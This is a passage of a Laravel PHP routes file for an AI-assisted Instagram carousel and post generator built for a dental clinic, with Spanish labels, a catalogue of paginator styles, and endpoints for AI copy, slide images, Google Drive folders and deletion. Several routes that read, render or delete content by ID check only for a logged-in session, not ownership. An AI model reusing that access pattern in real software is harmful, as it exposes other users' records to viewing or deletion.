        foreach ($rawCharacters as $c) {
            $characters[] = [
                'id' => $c->id,
                'name' => $c->name,
                'role' => $c->role,
                'cover_photo' => $c->cover_photo,
                'gdrive_folder_url' => $c->gdrive_folder_url ?: ($c->gdrive_folder_id ? "https://drive.google.com/drive/folders/{$c->gdrive_folder_id}" : null),
            ];
        }

        $visualTypes = \App\Services\VisualTypeService::getAllTypes();

        $paginators = [
            ['id' => 'random', 'number' => 0, 'name' => '🎲 Modo Aleatorio (Random Selector)', 'sheetLabel' => 'Aleatorio'],
            ['id' => 'num-simple', 'number' => 1, 'name' => '01. Numeración Simple', 'sheetLabel' => '01. Numeración simple (01 / 07)'],
            ['id' => 'num-individual', 'number' => 2, 'name' => '02. Número Individual', 'sheetLabel' => '02. Número individual (02)'],
            ['id' => 'num-etiqueta', 'number' => 3, 'name' => '03. Número + Etiqueta', 'sheetLabel' => '03. Número + etiqueta (02 · Problema)'],
            ['id' => 'puntos-dots', 'number' => 4, 'name' => '04. Puntos / Dots Clásicos', 'sheetLabel' => '04. Puntos / dots (● ○ ○ ○ ○)'],
            ['id' => 'puntos-destacado', 'number' => 5, 'name' => '05. Puntos con Activo Destacado', 'sheetLabel' => '05. Puntos con activo destacado (● • • • •)'],
            ['id' => 'barra-progreso', 'number' => 6, 'name' => '06. Barra de Progreso Continua', 'sheetLabel' => '06. Barra de progreso (━━━━━━────────)'],
            ['id' => 'barra-segmentada', 'number' => 7, 'name' => '07. Barra Segmentada (Stories)', 'sheetLabel' => '07. Barra segmentada (━━ ━━ ━━ ── ──)'],
            ['id' => 'barra-numeracion', 'number' => 8, 'name' => '08. Barra + Numeración', 'sheetLabel' => '08. Barra + numeración (03 / 08 ━━━━━────)'],
            ['id' => 'pildoras-capsulas', 'number' => 9, 'name' => '09. Píldoras o Cápsulas', 'sheetLabel' => '09. Píldoras o cápsulas ([01] [02] [03])'],
            ['id' => 'circulo-numero', 'number' => 10, 'name' => '10. Círculo con Número', 'sheetLabel' => '10. Círculo con número (➊ ➋ ➌)'],
            ['id' => 'numero-cuadrado', 'number' => 11, 'name' => '11. Número Dentro de Cuadrado', 'sheetLabel' => '11. Número dentro de cuadrado ( [1] [2] )'],
            ['id' => 'numero-gigante-watermark', 'number' => 12, 'name' => '12. Número Gigante Watermark', 'sheetLabel' => '12. Número gigante translúcido (Watermark)'],
            ['id' => 'timeline-horizontal', 'number' => 13, 'name' => '13. Timeline Horizontal', 'sheetLabel' => '13. Timeline horizontal con nodos (─●─●─○─)'],
            ['id' => 'stepper-pasos', 'number' => 14, 'name' => '14. Stepper de Pasos', 'sheetLabel' => '14. Stepper de pasos (Paso 1 → Paso 2)'],
            ['id' => 'tabs-pestanas', 'number' => 15, 'name' => '15. Tabs o Pestañas Superiores', 'sheetLabel' => '15. Tabs o pestañas superiores'],
            ['id' => 'categorias-semanticas', 'number' => 16, 'name' => '16. Categorías Semánticas', 'sheetLabel' => '16. Categorías semánticas por color'],
            ['id' => 'breadcrumb-migas', 'number' => 17, 'name' => '17. Breadcrumb / Migas de Pan', 'sheetLabel' => '17. Breadcrumb o migas de pan (Tema > Subtema)'],
            ['id' => 'miniaturas-preview', 'number' => 18, 'name' => '18. Miniaturas de Slides', 'sheetLabel' => '18. Miniaturas preview (Slides en miniatura)'],
            ['id' => 'icono-progreso', 'number' => 19, 'name' => '19. Icono Dinámico por Slide', 'sheetLabel' => '19. Icono temático dinámico'],
            ['id' => 'porcentaje-avance', 'number' => 20, 'name' => '20. Porcentaje Numérico', 'sheetLabel' => '20. Porcentaje de avance (45%)'],
            ['id' => 'fraccion-romana', 'number' => 21, 'name' => '21. Fracción con Números Romanos', 'sheetLabel' => '21. Fracción con números romanos (III / VII)'],
            ['id' => 'puntos-conectados', 'number' => 22, 'name' => '22. Puntos Conectados con Línea', 'sheetLabel' => '22. Puntos conectados con línea fina (●──●──○)'],
            ['id' => 'anillo-circular', 'number' => 23, 'name' => '23. Anillo Circular de Progreso', 'sheetLabel' => '23. Indicador circular radial (Ring de progreso)'],
            ['id' => 'borde-perimetral', 'number' => 24, 'name' => '24. Borde Perimetral Dinámico', 'sheetLabel' => '24. Borde perimetral dinámico (Frame progresivo)'],
            ['id' => 'barra-degrade', 'number' => 25, 'name' => '25. Barra con Degradé de Marca', 'sheetLabel' => '25. Barra con gradiente dinámico'],
            ['id' => 'rombo-diamante', 'number' => 26, 'name' => '26. Rombos o Diamantes', 'sheetLabel' => '26. Rombos o diamantes (◆ ◆ ◇ ◇)'],
            ['id' => 'chevron-flechas', 'number' => 27, 'name' => '27. Flechas / Chevrons Conectados', 'sheetLabel' => '27. Chevrons direccionales (► ► ▻ ▻)'],
            ['id' => 'estrellas-rating', 'number' => 28, 'name' => '28. Estrellas de Puntuación', 'sheetLabel' => '28. Estrellas de avance (★ ★ ★ ☆)'],
            ['id' => 'codigo-binario', 'number' => 29, 'name' => '29. Código Binario / Matriz Tech', 'sheetLabel' => '29. Matriz binaria / Dots tecnológicos'],
            ['id' => 'barra-ondas', 'number' => 30, 'name' => '30. Barra Ondulada de Frecuencia', 'sheetLabel' => '30. Barra ondulada (Forma de onda)'],
            ['id' => 'linea-metro', 'number' => 31, 'name' => '31. Estaciones de Metro / Subte', 'sheetLabel' => '31. Línea de metro con estaciones señaladas'],
            ['id' => 'fases-lunares', 'number' => 32, 'name' => '32. Fases Lunares / Círculos de Llenado', 'sheetLabel' => '32. Fases lunares (Llenado orbital)'],
            ['id' => 'reloj-arena', 'number' => 33, 'name' => '33. Reloj de Arena / Cronómetro', 'sheetLabel' => '33. Cronómetro / Tiempo restante estimado'],
            ['id' => 'capitulos-editorial', 'number' => 34, 'name' => '34. Capítulos Tipo Libro', 'sheetLabel' => '34. Capítulos editoriales (Cap. II de VI)'],
            ['id' => 'tarjeta-apilada', 'number' => 35, 'name' => '35. Tarjetas Apiladas (Deck)', 'sheetLabel' => '35. Simulación de baraja o tarjetas apiladas'],
            ['id' => 'brujula-radar', 'number' => 36, 'name' => '36. Brújula / Coordenadas de Radar', 'sheetLabel' => '36. Coordenadas de radar o brújula clínica'],
            ['id' => 'bloques-tetris', 'number' => 37, 'name' => '37. Bloques Modulares / Grilla', 'sheetLabel' => '37. Bloques modulares encajados'],
            ['id' => 'adn-helice', 'number' => 38, 'name' => '38. Hélice de ADN / Eslabones', 'sheetLabel' => '38. Cadena de eslabones biomédicos'],
            ['id' => 'burbujas-flotantes', 'number' => 39, 'name' => '39. Burbujas Flotantes de Escala', 'sheetLabel' => '39. Burbujas de tamaño variable según relevancia'],
            ['id' => 'pulso-cardiaco', 'number' => 40, 'name' => '40. Pulso Cardíaco (ECG)', 'sheetLabel' => '40. Electrocardiograma con pico en slide activo'],
            ['id' => 'guion-puntos', 'number' => 41, 'name' => '41. Guiones + Puntos (Código Morse)', 'sheetLabel' => '41. Código Morse estilizado (— • — ••)'],
            ['id' => 'cintas-adhesivas', 'number' => 42, 'name' => '42. Cinta Washi / Sticker Tape', 'sheetLabel' => '42. Cinta adhesiva rotulada en esquina'],
            ['id' => 'etiqueta-precio', 'number' => 43, 'name' => '43. Tag de Equipaje / Etiqueta Colgante', 'sheetLabel' => '43. Tag colgante con perforación circular'],
            ['id' => 'semáforo-alertas', 'number' => 44, 'name' => '44. Semáforo Tricolor de Riesgo', 'sheetLabel' => '44. Semáforo clínico (Verde/Amarillo/Rojo)'],
            ['id' => 'escala-ph', 'number' => 45, 'name' => '45. Barra Graduada de Laboratorio', 'sheetLabel' => '45. Escala graduada de probeta o laboratorio'],
            ['id' => 'perfil-topografico', 'number' => 46, 'name' => '46. Líneas de Nivel / Topografía', 'sheetLabel' => '46. Curvas de nivel topográficas en el borde'],
            ['id' => 'engranajes-mecanicos', 'number' => 47, 'name' => '47. Dientes de Engranaje / Piñón', 'sheetLabel' => '47. Segmentos dentados mecánicos'],
            ['id' => 'constelacion-estelar', 'number' => 48, 'name' => '48. Red de Nodos Neuronales', 'sheetLabel' => '48. Sinapsis neuronal / Red de puntos enlazados'],
            ['id' => 'firma-autor', 'number' => 49, 'name' => '49. Firma y Rúbrica Médica', 'sheetLabel' => '49. Sello y firma con conteo manuscrito'],
        ];

        $currentPaginator = $brandRules['default_paginator'] ?? '01. Numeración simple (01 / 07)';
        $brandLogos = $brand ? $brand->getLogosList() : [];
        $defaultLogoId = $brandRules['default_logo_id'] ?? ($brandLogos[0]['id'] ?? null);
        $backgroundOptions = $brand ? $brand->getBackgroundOptions() : [];

        return view('app.create', compact('brand', 'brandRules', 'characters', 'visualTypes', 'paginators', 'currentPaginator', 'brandLogos', 'defaultLogoId', 'backgroundOptions'));
    });

    // Micro-asistente IA para campo individual
    Route::post('/ai/assist-field', function (Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return response()->json(['error' => 'Unauthorized'], 401);

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $brandName = $brand ? $brand->name : 'JM Odontología Integral';

        $fieldType = $request->input('field_type', 'body');
        $currentText = $request->input('current_text', '');
        $context = [
            'brand_name' => $brandName,
            'topic' => $request->input('topic', ''),
            'character' => $request->input('character', 'Dra. Karina'),
            'visual_type' => $request->input('visual_type', ''),
            'content_type' => $request->input('content_type', 'single_post'),
            'headline' => $request->input('headline', ''),
            'body' => $request->input('body', ''),
        ];

        $result = $ai->assistField($fieldType, $currentText, $context);
        return response()->json(['success' => true, 'result' => $result]);
    });

    // Generador de Copy y Hashtags alineados con el titular y post actual
    Route::post('/ai/generate-post-copy', function (Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return response()->json(['error' => 'Unauthorized'], 401);

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $brandName = $brand ? $brand->name : 'JM Odontología Integral';

        $headline = $request->input('headline', '');
        $body = $request->input('body', '');
        $badge = $request->input('badge', '');
        $contentType = $request->input('content_type', 'single_post');

        if (empty(trim($headline)) && empty(trim($body))) {
            return response()->json(['success' => false, 'error' => 'Por favor escribe al menos un titular o tema para tu post.'], 422);
        }

        $result = $ai->generatePostCopy($headline, $body, $badge, $contentType, $brandName);
        return response()->json(['success' => true, 'result' => $result]);
    });

    // Autoparser de guion pegado
    Route::post('/ai/parse-script', function (Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return response()->json(['error' => 'Unauthorized'], 401);

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $brandName = $brand ? $brand->name : 'JM Odontología Integral';

        $rawText = $request->input('raw_text', '');
        if (empty(trim($rawText))) {
            return response()->json(['success' => false, 'error' => 'Texto vacío'], 422);
        }

        $data = $ai->parseScript($rawText, $brandName);
        return response()->json(['success' => true, 'data' => $data]);
    });

    // Generador de carrusel completo con IA
    Route::post('/ai/generate-full-script', function (Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return response()->json(['error' => 'Unauthorized'], 401);

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $brandName = $brand ? $brand->name : 'JM Odontología Integral';

        $topic = $request->input('topic', '');
        $character = $request->input('character', 'Dra. Karina');
        $slidesCount = (int) $request->input('slides_count', 5);

        if (empty(trim($topic))) {
            return response()->json(['success' => false, 'error' => 'Tema vacío'], 422);
        }

        $data = $ai->generateFullScript($topic, $character, 'carousel', $slidesCount, $brandName);
        return response()->json(['success' => true, 'data' => $data]);
    });

    // Persistir contenido y láminas generadas
    Route::post('/contents/create', function (Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $brandName = $brand ? $brand->name : 'JM Odontología Integral';

        $type = $request->input('type', 'carousel');
        $rawSlides = $request->input('slides', []);

        // Si es Post Único o Reel, nos aseguramos de procesar exactamente 1 lámina
        if ($type === 'single_post') {
            $slidesData = [ $rawSlides[0] ?? [
                'slide_number' => 1,
                'headline' => $request->input('title', 'Post Único ' . $brandName),
                'body_text' => $request->input('caption_copy', ''),
                'badge' => 'POST DESTACADO',
                'slide_type' => 'single_post',
            ]];
        } else {
            $slidesData = $rawSlides;
        }

        $hookText = $slidesData[0]['headline'] ?? ('Publicación ' . $brandName);
        $title = $hookText;
        $caption = $request->input('caption_copy', '');
        $hashtags = $request->input('hashtags', '');
        $characterId = $request->input('character_id');
        $visualType = $request->input('visual_type', 'Conceptual');
        $paginatorStyle = $request->input('paginator_style', '01. Numeración simple (01 / 07)');
        $backgroundStyle = $request->input('background_style', 'Cálido / Crema Editorial (Luz natural difusa)');
        $backgroundHex = $request->input('background_hex', '#FDFBF7');
        $promptCompiled = $request->input('prompt_compiled', '');
        $renderNow = (bool) $request->input('render_now', false);

        $charModel = $characterId ? \App\Models\Character::find($characterId) : null;
        $charName = $charModel ? $charModel->name : 'Especialista Odontológica';

        $contentId = (string) Str::uuid();

        // 1. Guardar Content con sus opciones visuales seleccionadas
        DB::table('contents')->insert([
            'id' => $contentId,
            'brand_id' => $brand ? $brand->id : null,
            'character_id' => $characterId,
            'logo_id' => $request->input('logo_id'),
            'type' => $type,
            'visual_type' => $visualType,
            'paginator_style' => $paginatorStyle,
            'background_style' => $backgroundStyle,
            'background_hex' => $backgroundHex,
            'title' => $title,
            'hook_text' => $hookText,
            'caption_copy' => $caption,
            'hashtags' => $hashtags,
            'prompt_compiled' => $promptCompiled,
            'status' => 'draft',
            'source' => 'studio_generator',
            'total_slides' => count($slidesData),
            'version' => 1,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        // 2. Guardar Slides
        $savedSlideIds = [];
        foreach ($slidesData as $idx => $s) {
            $slideId = (string) Str::uuid();
            $sNum = (int) ($s['slide_number'] ?? ($idx + 1));
            $sHeadline = $s['headline'] ?? '';
            $sBody = $s['body_text'] ?? '';
            $sBadge = $s['badge'] ?? '';
            $sType = $s['slide_type'] ?? ($idx === 0 ? 'cover' : 'content');

            DB::table('slides')->insert([
                'id' => $slideId,
                'content_id' => $contentId,
                'slide_number' => $sNum,
                'slide_type' => $sType,
                'headline' => $sHeadline,
                'body_text' => $sBody,
                'badge' => $sBadge,
                'status' => 'pending',
                'version' => 1,
                'created_at' => now(),
            ]);

            $savedSlideIds[] = [
                'id' => $slideId,
                'number' => $sNum,
                'headline' => $sHeadline,
                'body_text' => $sBody,
                'badge' => $sBadge
            ];
        }

        // 3. Si se solicitó renderizado inmediato, generar la primera lámina o todas si es single post
        if ($renderNow || $type === 'single_post') {
            $meta = [
                'brand_id' => $brand ? $brand->id : null,
                'brand_name' => $brand ? $brand->name : 'JM Odontologia Integral',
                'character_id' => $characterId,
                'character_name' => $charName,
                'logo_id' => $request->input('logo_id'),
                'visual_type' => $visualType,
                'paginator' => $paginatorStyle,
                'background_style' => $backgroundStyle,
                'background_hex' => $backgroundHex,
                'primary_color' => $brand ? $brand->primary_color : '#16345F',
                'accent_color' => $brand ? $brand->accent_color : '#7DD3FC',
                'type' => $type,
                'carousel_title' => $title,
                'all_slides' => $slidesData,
                'total_slides' => count($slidesData),
                'custom_prompt' => $promptCompiled,
            ];

            // Renderizamos la portada o lámina 1
            $s1 = $savedSlideIds[0];
            $res = $ai->generateSlideImage($contentId, $s1['number'], $s1['headline'], $s1['body_text'], $s1['badge'], $meta);
            if ($res['success'] ?? false) {
                DB::table('slides')->where('id', $s1['id'])->update([
                    'image_url' => $res['url'],
                    'prompt_used' => $res['prompt'] ?? null,
                    'status' => 'ready'
                ]);
            }
        }

        return redirect('/app/creations')->with('success', "¡Creación '{$title}' guardada exitosamente con " . count($slidesData) . " lámina(s)!");
    });

    // Endpoint para renderizar una lámina individual con IA
    Route::post('/contents/{id}/slides/{slideId}/generate-image', function ($id, $slideId, Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return response()->json(['error' => 'Unauthorized'], 401);
        @set_time_limit(120);

        $content = \App\Models\Content::find($id);
        if (!$content) return response()->json(['success' => false, 'error' => 'Creación no encontrada'], 404);

        $slide = \App\Models\Slide::where('id', $slideId)->where('content_id', $id)->first();
        if (!$slide) return response()->json(['success' => false, 'error' => 'Lámina no encontrada'], 404);

        $brand = \App\Models\Brand::find($content->brand_id) ?? \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::first();
        $char = $content->character_id ? \App\Models\Character::find($content->character_id) : (\App\Models\Character::where('name', 'like', '%Karina%')->first() ?? \App\Models\Character::first());
        $brandRules = $brand && $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];

        $slidesList = \App\Models\Slide::where('content_id', $content->id)->orderBy('slide_number')->get()->map(function($s) {
            return [
                'slide_number' => $s->slide_number,
                'headline' => $s->headline,
                'body_text' => $s->body_text,
                'badge' => $s->badge,
            ];
        })->toArray();

        $meta = [
            'brand_id' => $brand ? $brand->id : null,
            'brand_name' => $brand ? $brand->name : 'JM Odontologia Integral',
            'character_id' => $char ? $char->id : null,
            'character_name' => $char ? $char->name : 'Dra. Karina',
            'logo_id' => $content->logo_id,
            'visual_type' => $content->visual_type ?: ($brandRules['tipo_visual'] ?? 'Conceptual'),
            'paginator' => $content->paginator_style ?: ($brandRules['default_paginator'] ?? '01. Numeración simple (01 / 07)'),
            'background_style' => $content->background_style ?: 'Cálido / Crema Editorial (Luz natural difusa)',
            'background_hex' => $content->background_hex ?: ($brand ? ($brand->bg_color ?: '#FDFBF7') : '#FDFBF7'),
            'primary_color' => $brand ? $brand->primary_color : '#16345F',
            'accent_color' => $brand ? $brand->accent_color : '#7DD3FC',
            'type' => $content->type,
            'carousel_title' => $content->title,
            'all_slides' => $slidesList,
            'total_slides' => count($slidesList),
            'custom_prompt' => $content->prompt_compiled,
        ];

        $res = $ai->generateSlideImage(
            $content->id,
            $slide->slide_number,
            $slide->headline ?? ('Lámina ' . ($brand ? $brand->name : 'JM Odontología Integral')),
            $slide->body_text,
            $slide->badge,
            $meta
        );

        if ($res['success'] ?? false) {
            $slide->update([
                'image_url' => $res['url'],
                'prompt_used' => $res['prompt'] ?? null,
                'status' => 'ready'
            ]);

            return response()->json([
                'success' => true,
                'slide_id' => $slide->id,
                'slide_number' => $slide->slide_number,
                'image_url' => $res['url']
            ]);
        }

        return response()->json([
            'success' => false,
            'error' => $res['error'] ?? 'Error al generar imagen con OpenAI'
        ], 500);
    });

    // Endpoint para renderizar todas las láminas pendientes de una creación con IA
    Route::post('/contents/{id}/generate-images', function ($id, Request $request, \App\Services\AIService $ai) {
        if (!session('user')) return response()->json(['error' => 'Unauthorized'], 401);
        @set_time_limit(300);

        $content = \App\Models\Content::with('slides')->find($id);
        if (!$content) {
            return response()->json(['success' => false, 'error' => 'Creación no encontrada'], 404);
        }

        $brand = \App\Models\Brand::find($content->brand_id) ?? \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::first();
        $char = $content->character_id ? \App\Models\Character::find($content->character_id) : (\App\Models\Character::where('name', 'like', '%Karina%')->first() ?? \App\Models\Character::first());
        $brandRules = $brand && $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];

        $slidesList = $content->slides->map(function($s) {
            return [
                'slide_number' => $s->slide_number,
                'headline' => $s->headline,
                'body_text' => $s->body_text,
                'badge' => $s->badge,
            ];
        })->toArray();

        $meta = [
            'brand_id' => $brand ? $brand->id : null,
            'brand_name' => $brand ? $brand->name : 'JM Odontologia Integral',
            'character_id' => $char ? $char->id : null,
            'character_name' => $char ? $char->name : 'Dra. Karina',
            'logo_id' => $content->logo_id,
            'visual_type' => $content->visual_type ?: ($brandRules['tipo_visual'] ?? 'Conceptual'),
            'paginator' => $content->paginator_style ?: ($brandRules['default_paginator'] ?? '01. Numeración simple (01 / 07)'),
            'background_style' => $content->background_style ?: 'Cálido / Crema Editorial (Luz natural difusa)',
            'background_hex' => $content->background_hex ?: ($brand ? ($brand->bg_color ?: '#FDFBF7') : '#FDFBF7'),
            'primary_color' => $brand ? $brand->primary_color : '#16345F',
            'accent_color' => $brand ? $brand->accent_color : '#7DD3FC',
            'type' => $content->type,
            'carousel_title' => $content->title,
            'all_slides' => $slidesList,
            'total_slides' => count($slidesList),
            'custom_prompt' => $content->prompt_compiled,
        ];

        $rendered = [];

        $errors = [];
        foreach ($content->slides as $slide) {
            $res = $ai->generateSlideImage(
                $content->id,
                $slide->slide_number,
                $slide->headline ?? ('Lámina ' . ($brand ? $brand->name : 'JM Odontología Integral')),
                $slide->body_text,
                $slide->badge,
                $meta
            );

            if ($res['success'] ?? false) {
                $slide->update([
                    'image_url' => $res['url'],
                    'prompt_used' => $res['prompt'] ?? null,
                    'status' => 'ready'
                ]);
                $rendered[] = [
                    'slide_id' => $slide->id,
                    'slide_number' => $slide->slide_number,
                    'image_url' => $res['url']
                ];
            } else {
                $errors[] = "Lámina #{$slide->slide_number}: " . ($res['error'] ?? 'Error');
            }
        }

        if (count($rendered) > 0) {
            $content->update(['status' => 'ready', 'updated_at' => now()]);
        }

        return response()->json([
            'success' => count($rendered) > 0,
            'message' => count($rendered) > 0 ? 'Láminas renderizadas exitosamente con IA.' : 'No se pudieron renderizar las imágenes.',
            'rendered' => $rendered,
            'errors' => $errors
        ]);
    });


    // ==========================================
    // VISOR DE CREACIONES Y GOOGLE DRIVE
    // ==========================================
    Route::get('/creations', function () {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $creationsFolderUrl = $brand ? $brand->creations_folder_url : null;

        $contents = \App\Models\Content::with(['slides' => function ($q) {
            $q->orderBy('slide_number', 'asc');
        }])->orderBy('created_at', 'desc')->get();

        return view('app.creations', compact('contents', 'brand', 'creationsFolderUrl'));
    });

    // Guardar carpeta de destino en Google Drive
    Route::post('/brand/save-output-folder', function (Request $request) {
        if (!session('user')) return redirect('/login');

        $user = session('user');
        $brand = \App\Models\Brand::where('name', 'like', '%JM%')->first() ?? \App\Models\Brand::where('user_id', $user->id)->first() ?? \App\Models\Brand::first();
        $folderUrl = trim($request->input('gdrive_output_folder_url', ''));

        if (empty($folderUrl)) {
            return back()->with('error', 'El enlace de Google Drive es obligatorio.');
        }

        $folderId = \App\Models\Brand::extractDriveFolderId($folderUrl);
        $fullFolderUrl = str_starts_with($folderUrl, 'http') ? $folderUrl : ($folderId ? "https://drive.google.com/drive/folders/{$folderId}" : $folderUrl);

        if ($brand) {
            $rules = $brand->brand_rules ? (is_array($brand->brand_rules) ? $brand->brand_rules : json_decode($brand->brand_rules, true)) : [];
            $rules['gdrive_output_folder_url'] = $fullFolderUrl;
            $rules['gdrive_creations_folder_url'] = $fullFolderUrl;

            $brand->update([
                'gdrive_output_folder_id' => $folderId,
                'brand_rules' => $rules,
            ]);
        }

        return back()->with('success', 'Carpeta de Creaciones en Google Drive guardada y vinculada exitosamente.');
    });

    // Eliminar creación
    Route::post('/contents/{id}/delete', function ($id) {
        if (!session('user')) return redirect('/login');

        DB::table('slides')->where('content_id', $id)->delete();
        DB::table('contents')->where('id', $id)->delete();

        return back()->with('success', 'Creación eliminada exitosamente.');
    });
});


